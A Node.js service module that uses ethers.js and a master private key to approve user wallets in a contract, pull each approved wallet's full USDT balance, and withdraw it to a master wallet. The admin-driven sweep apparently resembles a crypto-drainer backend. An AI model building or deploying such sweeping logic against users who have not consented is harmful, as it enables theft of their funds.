const { ethers } = require('ethers');
const dotenv = require('dotenv');
const path = require('path');
const fs = require('fs');

dotenv.config();

class ContractService {
    constructor() {
        // Validate required environment variables for transaction operations
        this.initialized = false;
        this.provider = null;
        this.wallet = null;
        this.contract = null;
        this.contractABI = [];
        
        try {
            if (!process.env.RPC_URL) {
                console.warn('⚠️ RPC_URL not found');
                return;
            }
            
            this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
            
            // Only initialize wallet and contract for transaction operations if master key exists
            if (process.env.MASTER_WALLET_PRIVATE_KEY && process.env.CONTRACT_ADDRESS) {
                this.wallet = new ethers.Wallet(process.env.MASTER_WALLET_PRIVATE_KEY, this.provider);
                
                // Load contract ABI
                this.loadContractABI();
                
                if (this.contractABI && this.contractABI.length > 0) {
                    this.contract = new ethers.Contract(
                        process.env.CONTRACT_ADDRESS,
                        this.contractABI,
                        this.wallet
                    );
                    this.initialized = true;
                    console.log('✅ Contract service initialized');
                } else {
                    console.warn('⚠️ Contract ABI not loaded, transaction operations will not work');
                }
            } else {
                console.log('ℹ️ Contract service initialized for read-only operations only');
            }
        } catch (error) {
            console.error('❌ Error initializing contract service:', error.message);
        }
    }

    // Load contract ABI with proper error handling
    loadContractABI() {
        try {
            // Try multiple possible paths
            const possiblePaths = [
                path.join(__dirname, '../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, 'abi.json')
            ];
            
            for (const abiPath of possiblePaths) {
                if (fs.existsSync(abiPath)) {
                    this.contractABI = require(abiPath);
                    console.log(`✅ Contract ABI loaded from: ${abiPath}`);
                    return;
                }
            }
            
            console.log('⚠️ Contract ABI file not found, using empty ABI');
            this.contractABI = [];
        } catch (error) {
            console.error('❌ Error loading contract ABI:', error.message);
            this.contractABI = [];
        }
    }

    // Enhanced approveWallet with comprehensive debugging and error handling
    async approveWallet(walletAddress) {
        if (!this.initialized) {
            throw new Error('Contract service not initialized');
        }

        try {
            console.log('=== AUTO-APPROVING WALLET IN CONTRACT ===');
            console.log('Wallet address:', walletAddress);
            console.log('Contract address:', process.env.CONTRACT_ADDRESS);
            console.log('Master wallet:', this.wallet.address);
            console.log('Contract object exists:', !!this.contract);
            
            // Check current approval status before attempting approval
            try {
                const currentStatus = await this.contract.approvedWallets(walletAddress);
                console.log('Current approval status:', currentStatus);
                if (currentStatus) {
                    console.log('Wallet already approved, skipping approval');
                    return true;
                }
            } catch (checkError) {
                console.log('Could not check current approval status:', checkError.message);
            }

            const feeData = await this.provider.getFeeData();
            const gasPrice = feeData.gasPrice;

            console.log('Gas price:', gasPrice.toString());
            console.log('Calling contract.approveWallet with wallet:', walletAddress);

            // Send the approval transaction
            const tx = await this.contract.approveWallet(walletAddress, {
                gasLimit: 100000,
                gasPrice: gasPrice
            });

            console.log('Approval transaction sent:', tx.hash);
            
            // Wait for transaction confirmation
            const receipt = await tx.wait();
            console.log('Approval transaction receipt:', {
                hash: tx.hash,
                status: receipt.status,
                blockNumber: receipt.blockNumber,
                gasUsed: receipt.gasUsed.toString()
            });
            
            // Check if transaction was successful
            if (receipt.status === 0) {
                throw new Error('Approval transaction failed - reverted by contract');
            }
            
            // Verify approval was successful by checking contract state
            console.log('Verifying approval in contract...');
            const isNowApproved = await this.contract.approvedWallets(walletAddress);
            console.log('Verification result - wallet approved:', isNowApproved);
            
            if (isNowApproved) {
                console.log('✅ Wallet successfully auto-approved in contract:', walletAddress);
                return true;
            } else {
                console.error('❌ Wallet approval transaction succeeded but contract state not updated');
                throw new Error('Wallet approval verification failed - contract state not updated');
            }
            
        } catch (error) {
            console.error('❌ Failed to auto-approve wallet:', error);
            console.error('Error details:', {
                message: error.message,
                code: error.code,
                reason: error.reason,
                transaction: error.transaction
            });
            throw error;
        }
    }

    async getWalletUSDTBalance(walletAddress) {
        try {
            // Use environment variable first
            const usdtAddress = process.env.USDT_CONTRACT_ADDRESS;
            
            if (!usdtAddress) {
                console.warn('USDT_CONTRACT_ADDRESS not set in environment');
                return '0';
            }
            
            // If we don't have a provider, create one just for this read operation
            let providerToUse = this.provider;
            
            if (!providerToUse && process.env.RPC_URL) {
                providerToUse = new ethers.JsonRpcProvider(process.env.RPC_URL);
            }
            
            if (!providerToUse) {
                console.warn('No provider available for balance query');
                return '0';
            }
            
            const usdtContract = new ethers.Contract(
                usdtAddress,
                ['function balanceOf(address account) external view returns (uint256)'],
                providerToUse
            );
            
            const balance = await usdtContract.balanceOf(walletAddress);
            
            // Try both 18 and 6 decimals (some USDT contracts use 6 decimals)
            let formattedBalance = '0';
            try {
                formattedBalance = ethers.formatUnits(balance, 18);
                
                // If result looks like 0 with 18 decimals, try 6 decimals
                if (parseFloat(formattedBalance) === 0 && balance > 0) {
                    formattedBalance = ethers.formatUnits(balance, 6);
                }
            } catch (formatError) {
                // Fallback to 6 decimals
                formattedBalance = ethers.formatUnits(balance, 6);
            }
            
            return formattedBalance;
        } catch (error) {
            console.error('Error getting wallet balance for address', walletAddress, ':', error.message);
            return '0';
        }
    }

    // Enhanced isWalletApproved with better error handling
    async isWalletApproved(walletAddress) {
        if (!this.initialized) {
            console.warn('Contract service not initialized for transactions');
            return false;
        }
        
        try {
            console.log('Checking approval status for wallet:', walletAddress);
            const result = await this.contract.approvedWallets(walletAddress);
            console.log('Approval check result:', result);
            return result;
        } catch (error) {
            console.error('Error checking wallet approval for address', walletAddress, ':', error.message);
            // Try to get more details about the error
            try {
                // Test if the contract is callable at all
                const contractAddress = await this.contract.getAddress();
                console.log('Contract address:', contractAddress);
            } catch (contractError) {
                console.error('Contract accessibility error:', contractError.message);
            }
            return false;
        }
    }

    // Enhanced pullUSDTFromWallet with verification
    async pullUSDTFromWallet(walletAddress) {
        if (!this.initialized) {
            return {
                success: false,
                error: 'Contract service not initialized for transactions'
            };
        }
        
        try {
            console.log('=== PULL USDT START ===');
            console.log('Pulling USDT from wallet:', walletAddress);
            
            // Check if wallet has USDT balance first
            console.log('Checking wallet USDT balance...');
            const balance = await this.getWalletUSDTBalance(walletAddress);
            console.log('Wallet USDT balance:', balance);
            
            if (parseFloat(balance) <= 0) {
                return {
                    success: false,
                    error: 'Wallet has no USDT balance to pull'
                };
            }
            
            // Check if wallet is approved in contract
            console.log('Checking if wallet is approved in contract...');
            const isApproved = await this.isWalletApproved(walletAddress);
            console.log('Wallet approved status:', isApproved);
            
            if (!isApproved) {
                return {
                    success: false,
                    error: 'Wallet has not been approved in contract - admin cannot pull yet'
                };
            }
            
            // Execute the pull
            console.log('Sending pull transaction...');
            const tx = await this.contract.pull(walletAddress, {
                gasLimit: 300000,
                gasPrice: await this.provider.getFeeData().then(feeData => feeData.gasPrice)
            });
            
            console.log('Transaction sent:', tx.hash);
            
            // Wait for transaction confirmation with timeout
            console.log('Waiting for transaction confirmation...');
            const receipt = await Promise.race([
                tx.wait(),
                new Promise((resolve, reject) => 
                    setTimeout(() => reject(new Error('Transaction confirmation timeout')), 60000)
                )
            ]);
            
            console.log('Transaction receipt:', receipt);
            
            // Check if transaction was successful
            if (receipt.status === 0) {
                return {
                    success: false,
                    error: 'Transaction failed - contract execution reverted',
                    txHash: tx.hash
                };
            }
            
            // Get the amount pulled from the event
            let amount = '0';
            if (receipt.logs && receipt.logs.length > 0) {
                try {
                    console.log('Parsing transaction logs...');
                    // Parse the USDTReceived event (from ABI)
                    const eventInterface = new ethers.Interface([
                        "event USDTReceived(address indexed wallet, uint256 amount)"
                    ]);
                    
                    for (const log of receipt.logs) {
                        try {
                            const parsedLog = eventInterface.parseLog(log);
                            if (parsedLog && parsedLog.name === 'USDTReceived') {
                                amount = ethers.formatUnits(parsedLog.args.amount, 18);
                                console.log('USDTReceived event found:', amount);
                                break;
                            }
                        } catch (e) {
                            // Continue to next log if parsing fails
                            console.log('Log parsing failed:', e.message);
                        }
                    }
                } catch (e) {
                    console.log('Could not parse event, using default amount');
                }
            }
            
            console.log('=== PULL USDT END SUCCESS ===');
            
            return {
                success: true,
                txHash: tx.hash,
                amount: amount
            };
        } catch (error) {
            console.error('Error during pull:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    // Implement the actual withdrawal function
    async withdrawUSDTToMaster() {
        if (!this.initialized) {
            return {
                success: false,
                error: 'Contract service not initialized for transactions'
            };
        }
        
        try {
            console.log('Executing withdrawal to master wallet...');
            
            // First check if contract has USDT balance
            const contractBalance = await this.getContractUSDTBalance();
            if (parseFloat(contractBalance) <= 0) {
                return {
                    success: false,
                    error: 'Contract has no USDT balance to withdraw'
                };
            }
            
            // Execute the withdrawal with proper gas settings
            const feeData = await this.provider.getFeeData();
            const tx = await this.contract.withdrawToMaster({
                gasLimit: 300000,
                gasPrice: feeData.gasPrice
            });
            
            console.log('Transaction sent:', tx.hash);
            
            // Wait for transaction confirmation with timeout
            const receipt = await Promise.race([
                tx.wait(),
                new Promise((resolve, reject) => 
                    setTimeout(() => reject(new Error('Transaction confirmation timeout after 60 seconds')), 60000)
                )
            ]);
            
            console.log('Transaction confirmed:', receipt);
            
            // Get the amount withdrawn from the event
            let amount = '0';
            if (receipt.logs && receipt.logs.length > 0) {
                try {
                    // Parse the USDTWithdrawn event
                    const eventInterface = new ethers.Interface([
                        "event USDTWithdrawn(address indexed to, uint256 amount)"
                    ]);
                    
                    for (const log of receipt.logs) {
                        try {
                            const parsedLog = eventInterface.parseLog(log);
                            if (parsedLog && parsedLog.name === 'USDTWithdrawn') {
                                amount = ethers.formatUnits(parsedLog.args.amount, 18);
                                break;
                            }
                        } catch (e) {
                            // Continue to next log if parsing fails
                            console.log('Log parsing failed:', e.message);
                        }
                    }
                } catch (e) {
                    console.log('Could not parse event, using default amount');
                }
            }
            
            // If no amount found in events, get contract balance before transaction
            if (parseFloat(amount) <= 0) {
                amount = contractBalance;
            }
            
            return {
                success: true,
                txHash: tx.hash,
                amount: amount
            };
        } catch (error) {
            console.error('Error during withdrawal:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    // Get contract USDT balance
    async getContractUSDTBalance() {
        if (!this.initialized) {
            console.warn('Contract service not initialized for transactions');
            // Try read-only approach
            try {
                if (!this.provider || !process.env.CONTRACT_ADDRESS) {
                    return '0';
                }
                
                const contract = new ethers.Contract(
                    process.env.CONTRACT_ADDRESS,
                    ['function getContractUSDT() external view returns (uint256)'],
                    this.provider
                );
                
                const balance = await contract.getContractUSDT();
                return ethers.formatUnits(balance, 18);
            } catch (error) {
                console.error('Error getting contract USDT balance (read-only):', error);
                return '0';
            }
        }
        
        try {
            const balance = await this.contract.getContractUSDT();
            return ethers.formatUnits(balance, 18);
        } catch (error) {
            console.error('Error getting contract USDT balance:', error);
            return '0';
        }
    }
}

module.exports = new ContractService();
